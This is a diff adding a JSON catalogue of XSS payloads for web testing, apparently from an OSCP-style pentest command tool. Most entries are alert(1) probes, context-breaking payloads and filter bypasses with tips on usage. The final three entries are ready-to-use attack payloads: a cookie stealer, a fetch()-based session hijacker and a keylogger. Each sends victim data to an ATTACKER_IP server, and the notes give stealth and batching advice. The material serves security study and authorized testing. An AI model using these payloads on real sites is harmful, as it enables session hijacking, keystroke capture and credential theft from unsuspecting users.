@@ -1,0 +1,515 @@
+{
+  "category": "web",
+  "commands": [
+    {
+      "id": "xss-test-svg-onload",
+      "name": "XSS Test - SVG onload Event",
+      "category": "web",
+      "command": "<svg onload=alert(1)>",
+      "description": "XSS test payload using SVG onload event handler, effective when script tags are filtered but HTML tags allowed",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "TEST_PAYLOAD",
+        "OSCP:MEDIUM"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Alert dialog appears in browser",
+        "JavaScript executes without errors",
+        "Payload reflected unescaped in HTML source"
+      ],
+      "failure_indicators": [
+        "Payload HTML-encoded: &lt;svg",
+        "Content Security Policy blocks execution",
+        "SVG tags stripped by WAF/filter"
+      ],
+      "prerequisites": [],
+      "alternatives": [
+        "xss-test-body-onload",
+        "xss-test-img-onerror",
+        "xss-test-script-basic"
+      ],
+      "next_steps": [
+        "xss-cookie-stealer",
+        "xss-session-hijack-fetch"
+      ],
+      "troubleshooting": {
+        "SVG tags stripped": "Try alternative event handlers: xss-test-img-onerror",
+        "CSP blocks execution": "Check CSP headers: curl -I <URL> | grep -i content-security",
+        "Payload encoded": "Test input sanitization bypass techniques"
+      },
+      "notes": "Use when:\nTesting for XSS in contexts where <script> tags are filtered but HTML tags are allowed.\n\nWorks in:\nAll modern browsers.\n\nDelivery:\nInject in URL parameters (?param=<svg onload=alert(1)>), form fields, or anywhere user input is reflected.\n\nExpected result:\nBrowser alert() dialog.\n\nAUTHORIZATION REQUIRED:\nOnly test on systems you own or have written permission to test.\n\nResponsible disclosure:\nReport findings to security team before public disclosure.",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "xss-test-body-onload",
+      "name": "XSS Test - Body onload Event",
+      "category": "web",
+      "command": "<body onload=alert(1)>",
+      "description": "XSS test payload using body onload event handler, effective when full HTML injection is possible",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "TEST_PAYLOAD",
+        "OSCP:MEDIUM"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Alert dialog appears on page load",
+        "Body tag inserted into DOM",
+        "JavaScript executes in browser context"
+      ],
+      "failure_indicators": [
+        "Payload HTML-encoded: &lt;body",
+        "Body tags stripped/filtered",
+        "CSP prevents inline event handlers",
+        "Multiple <body> tags rejected by parser"
+      ],
+      "prerequisites": [],
+      "alternatives": [
+        "xss-test-svg-onload",
+        "xss-test-img-onerror",
+        "xss-test-script-basic"
+      ],
+      "next_steps": [
+        "xss-cookie-stealer",
+        "xss-session-hijack-fetch"
+      ],
+      "troubleshooting": {
+        "Body tag ignored": "Page may already have <body> tag, try: xss-test-img-onerror",
+        "onload blocked": "CSP restricts inline event handlers, try external script injection",
+        "Payload filtered": "Use obfuscation: <BoDy OnLoAd=alert(1)>"
+      },
+      "notes": "Use when:\nTesting for XSS where full HTML structure can be injected (rare in modern apps).\n\nWorks in:\nAll browsers, but less reliable than event-based payloads due to existing <body> tags.\n\nDelivery:\nPrimarily in contexts where entire HTML document can be controlled (e.g., stored XSS in page templates).\n\nAUTHORIZATION REQUIRED:\nOnly test on authorized targets.\n\nNote:\nThis payload is less practical than event handlers like SVG/IMG but useful for understanding HTML injection scope.",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "xss-test-img-onerror",
+      "name": "XSS Test - IMG onerror Event",
+      "category": "web",
+      "command": "<img src=x onerror=alert(1)>",
+      "description": "XSS test payload using IMG tag with onerror event, one of the most reliable XSS vectors",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "TEST_PAYLOAD",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Alert dialog appears when image fails to load",
+        "onerror event fires immediately",
+        "Payload reflected in HTML without encoding"
+      ],
+      "failure_indicators": [
+        "HTML encoding: &lt;img",
+        "src attribute blocked/sanitized",
+        "onerror handler stripped",
+        "CSP blocks inline event handlers"
+      ],
+      "prerequisites": [],
+      "alternatives": [
+        "xss-test-svg-onload",
+        "xss-test-body-onload",
+        "xss-test-script-basic"
+      ],
+      "next_steps": [
+        "xss-cookie-stealer",
+        "xss-session-hijack-fetch",
+        "xss-keylogger"
+      ],
+      "troubleshooting": {
+        "Image loading blocks payload": "Use invalid src to trigger onerror: src=x or src=invalid.jpg",
+        "onerror stripped": "Try alternative events: onload, onmouseover, onfocus",
+        "CSP violation": "Check if CSP allows inline event handlers: curl -I <URL> | grep CSP"
+      },
+      "notes": "Use when:\nMost common XSS test payload, works in contexts where IMG tags are allowed.\n\nWorks in:\nAll browsers, highly reliable because invalid src triggers onerror immediately.\n\nDelivery:\nURL parameters (?search=<img src=x onerror=alert(1)>), form inputs, comment fields.\n\nExpected result:\nImmediate alert() when page renders.\n\nADVANTAGES:\nSelf-contained (no external resources), fires on load, bypasses many filters.\n\nAUTHORIZATION:\nTest only on systems you own or have written permission to test.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "xss-test-script-basic",
+      "name": "XSS Test - Basic Script Tag",
+      "category": "web",
+      "command": "<script>alert(1)</script>",
+      "description": "Basic XSS test payload using script tag, most direct but heavily filtered method",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "TEST_PAYLOAD",
+        "OSCP:MEDIUM"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Alert dialog appears",
+        "Script executes on page load",
+        "Payload visible in page source unescaped"
+      ],
+      "failure_indicators": [
+        "HTML encoding: &lt;script&gt;",
+        "Script tags stripped/removed entirely",
+        "CSP blocks inline scripts",
+        "XSS filter triggers (X-XSS-Protection header)"
+      ],
+      "prerequisites": [],
+      "alternatives": [
+        "xss-test-img-onerror",
+        "xss-test-svg-onload",
+        "xss-test-script-context-break"
+      ],
+      "next_steps": [
+        "xss-filter-bypass-case",
+        "xss-filter-bypass-encoding",
+        "xss-cookie-stealer"
+      ],
+      "troubleshooting": {
+        "Script tags filtered": "Modern apps often filter <script>. Try event handlers: xss-test-img-onerror",
+        "CSP blocks inline scripts": "Look for CSP policy: curl -I <URL> | grep -i content-security-policy",
+        "XSS filter triggers": "Try obfuscation: <ScRiPt>alert(1)</ScRiPt> or encoding bypasses"
+      },
+      "notes": "Use when:\nTesting basic XSS protection, baseline test before trying advanced bypasses.\n\nWorks in:\nUnfiltered applications (rare in production).\n\nDelivery:\nAny input field, URL parameter.\n\nExpected result:\nImmediate alert() on page load.\n\nREALITY CHECK:\nMost modern applications filter <script> tags, so this payload often fails.\n\nUse as initial test, then try event-based alternatives if blocked.\n\nAUTHORIZATION:\nOnly test on authorized targets.",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "xss-test-script-context-break",
+      "name": "XSS Test - Script Context Breaking",
+      "category": "web",
+      "command": "\"><script>alert(1)</script>",
+      "description": "XSS payload that breaks out of HTML attribute context before injecting script",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "TEST_PAYLOAD",
+        "CONTEXT_BREAK",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Alert dialog appears",
+        "Attribute context successfully closed",
+        "New script tag inserted in HTML"
+      ],
+      "failure_indicators": [
+        "Double-quote escaped: \\\"",
+        "HTML encoding applied",
+        "Script tags stripped even after context break",
+        "Input length limited (truncates payload)"
+      ],
+      "prerequisites": [],
+      "alternatives": [
+        "xss-test-script-basic",
+        "xss-test-event-context-break"
+      ],
+      "next_steps": [
+        "xss-cookie-stealer",
+        "xss-session-hijack-fetch"
+      ],
+      "troubleshooting": {
+        "Quote escaped": "Try single quote variant: '><script>alert(1)</script>",
+        "Context unclear": "View page source to see injection context: <input value=\"USER_INPUT\">",
+        "Payload truncated": "Use shorter payload: \"><svg onload=alert(1)>"
+      },
+      "notes": "Use when:\nInput is reflected inside HTML attribute (common in search forms, user profiles).\n\nContext example:\n<input value=\"[YOUR INPUT HERE]\">.\n\nThe \" closes the attribute, > closes the tag, then <script> executes.\n\nWorks in:\nAll browsers if attribute escaping is missing.\n\nDelivery:\nTest by viewing page source first to identify injection context.\n\nExpected result:\nBrowser alert() after breaking out of attribute.\n\nTECHNIQUE:\nThis is a 'context-breaking' attack - understanding injection context is critical for XSS exploitation.\n\nAUTHORIZATION:\nTest only on authorized systems.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "xss-test-event-context-break",
+      "name": "XSS Test - Event Handler Context Break",
+      "category": "web",
+      "command": "\" onerror=alert(1) x=\"",
+      "description": "XSS payload that stays within tag context but adds malicious event handler attribute",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "TEST_PAYLOAD",
+        "CONTEXT_BREAK",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Alert fires when event triggers",
+        "onerror attribute successfully injected",
+        "Malicious handler visible in HTML source"
+      ],
+      "failure_indicators": [
+        "Double-quote escaped",
+        "Space character filtered/encoded",
+        "onerror attribute stripped",
+        "CSP blocks inline handlers"
+      ],
+      "prerequisites": [],
+      "alternatives": [
+        "xss-test-script-context-break",
+        "xss-test-img-onerror"
+      ],
+      "next_steps": [
+        "xss-cookie-stealer"
+      ],
+      "troubleshooting": {
+        "Event doesn't fire": "Combine with IMG tag: \"><img src=x onerror=alert(1)>",
+        "Space filtered": "Try alternative syntax: \"onerror=alert(1)x=\"",
+        "Quote escaped": "Check if single quotes work: ' onerror=alert(1) x='"
+      },
+      "notes": "Use when:\nInput reflected in HTML tag attribute where breaking out would be filtered.\n\nContext example:\n<img src=\"[YOUR INPUT]\">.\n\nPayload becomes:\n<img src=\"\" onerror=alert(1) x=\"\">.\n\nThe first \" closes src value, onerror= adds handler, x=\"\" absorbs trailing quote.\n\nWorks in:\nContexts where you can inject attributes but not break tags.\n\nDelivery:\nView source to identify tag context first.\n\nExpected result:\nAlert fires when event triggers (immediately for onerror with invalid src).\n\nADVANCED:\nThis technique shows understanding of HTML parsing - staying within tag context while injecting malicious attributes.\n\nAUTHORIZATION:\nTest only on authorized systems.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "xss-filter-bypass-case",
+      "name": "XSS Filter Bypass - Case Variation",
+      "category": "web",
+      "command": "<ScRiPt>alert(1)</ScRiPt>",
+      "description": "XSS filter bypass using case variation to evade blacklist filters",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "FILTER_BYPASS",
+        "OSCP:MEDIUM"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Bypass successful - alert fires",
+        "Case-sensitive filter defeated",
+        "Mixed-case tags execute normally"
+      ],
+      "failure_indicators": [
+        "Filter uses case-insensitive matching",
+        "Script tags stripped regardless of case",
+        "HTML normalizes to lowercase before filtering"
+      ],
+      "prerequisites": [
+        "xss-test-script-basic"
+      ],
+      "alternatives": [
+        "xss-filter-bypass-encoding",
+        "xss-test-img-onerror"
+      ],
+      "next_steps": [
+        "xss-filter-bypass-encoding",
+        "xss-cookie-stealer"
+      ],
+      "troubleshooting": {
+        "Still filtered": "Filter may be case-insensitive. Try: xss-filter-bypass-encoding",
+        "Not working": "HTML parsers are case-insensitive, but filters may not be. Test systematically."
+      },
+      "notes": "Use when:\nBasic XSS test (xss-test-script-basic) failed due to blacklist filter.\n\nHow it works:\nHTML is case-insensitive (<ScRiPt> = <script>), but naive filters may only block lowercase.\n\nWorks in:\nApplications with poorly-implemented blacklist filters.\n\nDelivery:\nSame as basic XSS test.\n\nExpected result:\nAlert fires if filter only checks lowercase 'script'.\n\nLEARNING POINT:\nThis demonstrates why blacklist filtering is ineffective - there are infinite variations to bypass.\n\nModern apps should use whitelist/sanitization instead.\n\nAUTHORIZATION:\nTest only on authorized systems.",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "xss-filter-bypass-encoding",
+      "name": "XSS Filter Bypass - HTML Entity Encoding",
+      "category": "web",
+      "command": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
+      "description": "XSS filter bypass using HTML entity encoding in event handler to evade signature-based filters",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "FILTER_BYPASS",
+        "ENCODING",
+        "OSCP:HIGH"
+      ],
+      "variables": [],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Alert fires after HTML entity decoding",
+        "Encoded payload bypasses filter",
+        "Browser decodes entities in attribute context"
+      ],
+      "failure_indicators": [
+        "Entities not decoded by browser",
+        "Filter normalizes/decodes before checking",
+        "CSP blocks inline handlers"
+      ],
+      "prerequisites": [
+        "xss-test-img-onerror"
+      ],
+      "alternatives": [
+        "xss-filter-bypass-case",
+        "xss-filter-bypass-encoding"
+      ],
+      "next_steps": [
+        "xss-cookie-stealer"
+      ],
+      "troubleshooting": {
+        "Not working": "HTML entities only decode in attribute values, not in tag names",
+        "Still filtered": "Try URL encoding: %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+        "Entities visible in output": "Browser should decode automatically - check context"
+      },
+      "notes": "Use when:\nBasic event handler XSS blocked by keyword filter (e.g., 'alert' blacklisted).\n\nHow it works:\nHTML entities (&#97; = 'a') encode the JavaScript in onerror attribute.\n\nBrowser decodes entities before executing JavaScript.\n\nEncoded:\nalert(1) = &#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;.\n\nWorks in:\nHTML attribute contexts where entities are decoded.\n\nDelivery:\nForm inputs, URL parameters.\n\nExpected result:\nBrowser decodes and executes alert(1).\n\nADVANCED:\nCan also use hex (&#x61;) or named entities (&lt;) depending on context.\n\nAUTHORIZATION:\nTest only on authorized systems.\n\nLEARNING:\nDemonstrates importance of canonicalization in input validation.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "xss-cookie-stealer",
+      "name": "XSS Cookie Stealer Payload",
+      "category": "web",
+      "command": "<script>document.location='http://<ATTACKER_IP>:<PORT>/steal.php?c='+document.cookie</script>",
+      "description": "XSS exploitation payload that exfiltrates victim's cookies to attacker-controlled server",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "EXPLOITATION",
+        "COOKIE_THEFT",
+        "OSCP:HIGH"
+      ],
+      "variables": [
+        {
+          "name": "<ATTACKER_IP>",
+          "description": "Attacker's IP address to receive stolen cookies",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Port where attacker's web server is listening",
+          "example": "8000",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Victim's browser sends request to attacker server",
+        "Cookie data appears in attacker's web server logs",
+        "Session token successfully captured"
+      ],
+      "failure_indicators": [
+        "HttpOnly flag prevents document.cookie access",
+        "CSP blocks external resource loading",
+        "CORS prevents cross-origin requests",
+        "Network firewall blocks outbound connection"
+      ],
+      "prerequisites": [
+        "python-http-server",
+        "nc-listener"
+      ],
+      "alternatives": [
+        "xss-session-hijack-fetch"
+      ],
+      "next_steps": [],
+      "troubleshooting": {
+        "HttpOnly cookies": "HttpOnly prevents JS access. Target other data: localStorage, sessionStorage",
+        "CSP blocks": "Check CSP: curl -I <URL> | grep -i content-security-policy",
+        "No cookies received": "Check attacker server running: python3 -m http.server <PORT>",
+        "XSS blocked": "First achieve basic XSS (xss-test-img-onerror) before exploitation"
+      },
+      "notes": "PREREQUISITES:\nStart listener on attacker machine:\npython3 -m http.server <PORT>.\n\nUse when:\nBasic XSS confirmed, targeting session hijacking.\n\nHow it works:\ndocument.cookie retrieves all accessible cookies, document.location redirects victim to attacker URL with cookies in query string.\n\nWorks in:\nAny browser, any XSS context.\n\nDelivery:\nUse proven XSS vector (IMG onerror, SVG onload) but replace alert(1) with this payload.\n\nExpected result:\nAttacker web server receives HTTP request with victim's cookies.\n\nCRITICAL:\nHttpOnly flag (set on sensitive cookies) prevents document.cookie access - check Set-Cookie headers.\n\nAUTHORIZATION:\nOnly use on authorized penetration tests.\n\nLEGAL:\nUnauthorized cookie theft is illegal.\n\nALTERNATIVES:\nUse fetch() API for stealthier exfiltration, or target localStorage for modern apps.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "xss-session-hijack-fetch",
+      "name": "XSS Session Hijack via Fetch API",
+      "category": "web",
+      "command": "<script>fetch('http://<ATTACKER_IP>:<PORT>/steal?c='+document.cookie)</script>",
+      "description": "Modern XSS exploitation using Fetch API to exfiltrate session data without page redirect",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "EXPLOITATION",
+        "SESSION_HIJACK",
+        "OSCP:HIGH"
+      ],
+      "variables": [
+        {
+          "name": "<ATTACKER_IP>",
+          "description": "Attacker's IP address to receive stolen data",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Port where attacker's web server is listening",
+          "example": "8000",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Fetch request sent to attacker server",
+        "Cookie data appears in server logs",
+        "Victim page remains functional (no redirect)",
+        "Stealthy - user may not notice attack"
+      ],
+      "failure_indicators": [
+        "HttpOnly flag prevents cookie access",
+        "CSP blocks fetch to external domain",
+        "CORS prevents cross-origin requests",
+        "fetch() not supported (old browsers)"
+      ],
+      "prerequisites": [
+        "python-http-server",
+        "nc-listener"
+      ],
+      "alternatives": [
+        "xss-cookie-stealer"
+      ],
+      "next_steps": [],
+      "troubleshooting": {
+        "CSP violation": "Check Content-Security-Policy header: curl -I <URL>",
+        "HttpOnly cookies": "Target alternative storage: localStorage, sessionStorage, or DOM content",
+        "No data received": "Ensure listener running: python3 -m http.server <PORT>",
+        "CORS error": "CORS doesn't prevent simple GET requests - check CSP instead"
+      },
+      "notes": "PREREQUISITES:\nStart listener:\npython3 -m http.server <PORT> or nc -lvnp <PORT>.\n\nUse when:\nBasic XSS confirmed, prefer stealth over xss-cookie-stealer (which redirects page).\n\nHow it works:\nfetch() API sends async HTTP request to attacker server without redirecting victim's page.\n\nModern alternative to XMLHttpRequest.\n\nWorks in:\nModern browsers (IE11+, all current browsers).\n\nDelivery:\nInject via proven XSS vector.\n\nExpected result:\nAttacker receives HTTP GET request with cookie data in query string, victim page remains unchanged.\n\nADVANTAGES over document.location:\nStealthy (no redirect), can send multiple requests, victim stays on page.\n\nLIMITATIONS:\nHttpOnly cookies still protected.\n\nCSP connect-src directive may block.\n\nAUTHORIZATION:\nOnly use on authorized tests.\n\nLEGAL:\nSession hijacking is illegal without authorization.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "xss-keylogger",
+      "name": "XSS Keylogger Payload",
+      "category": "web",
+      "command": "<script>document.onkeypress=function(e){fetch('http://<ATTACKER_IP>:<PORT>/log?k='+e.key)}</script>",
+      "description": "XSS exploitation payload that captures all keystrokes and sends to attacker server in real-time",
+      "tags": [
+        "XSS",
+        "WEB_SECURITY",
+        "EXPLOITATION",
+        "KEYLOGGER",
+        "OSCP:HIGH"
+      ],
+      "variables": [
+        {
+          "name": "<ATTACKER_IP>",
+          "description": "Attacker's IP address to receive keystroke logs",
+          "example": "10.10.14.5",
+          "required": true
+        },
+        {
+          "name": "<PORT>",
+          "description": "Port where attacker's web server is listening",
+          "example": "8000",
+          "required": true
+        }
+      ],
+      "flag_explanations": {},
+      "success_indicators": [
+        "Each keystroke generates HTTP request to attacker",
+        "Real-time keystroke capture in server logs",
+        "Victim continues normal interaction with page"
+      ],
+      "failure_indicators": [
+        "CSP blocks fetch to external domain",
+        "High network traffic may alert user",
+        "onkeypress event blocked/overridden",
+        "CSP prevents inline script execution"
+      ],
+      "prerequisites": [
+        "python-http-server",
+        "nc-listener"
+      ],
+      "alternatives": [],
+      "next_steps": [],
+      "troubleshooting": {
+        "No keystrokes captured": "Check onkeypress fires: Add console.log(e.key) first",
+        "CSP blocks fetch": "Check CSP policy: curl -I <URL> | grep -i content-security",
+        "Too many requests": "Buffer keystrokes, send batch every N seconds to reduce traffic",
+        "Event overridden": "Use addEventListener instead: document.addEventListener('keypress', ...)"
+      },
+      "notes": "PREREQUISITES:\nStart listener:\npython3 -m http.server <PORT>.\n\nUse when:\nStored XSS confirmed on high-value target (admin panels, login pages).\n\nHow it works:\nonkeypress event fires on every key, fetch() sends each keystroke to attacker.\n\nReal-time exfiltration.\n\nWorks in:\nAll modern browsers.\n\nDelivery:\nRequires stored/persistent XSS for effectiveness (reflected XSS won't capture much).\n\nExpected result:\nAttacker receives stream of HTTP requests with each key pressed.\n\nSTEALTH ISSUES:\nGenerates high network traffic (one request per keystroke), may be noticeable.\n\nIMPROVEMENT:\nBuffer keystrokes in array, send batch every 5 seconds to reduce traffic.\n\nAUTHORIZATION:\nOnly use on authorized penetration tests.\n\nLEGAL:\nKeylogging is serious crime without authorization.\n\nETHICS:\nEven in authorized tests, discuss scope with client before deploying keyloggers.",
+      "oscp_relevance": "high"
+    }
+  ]
+}
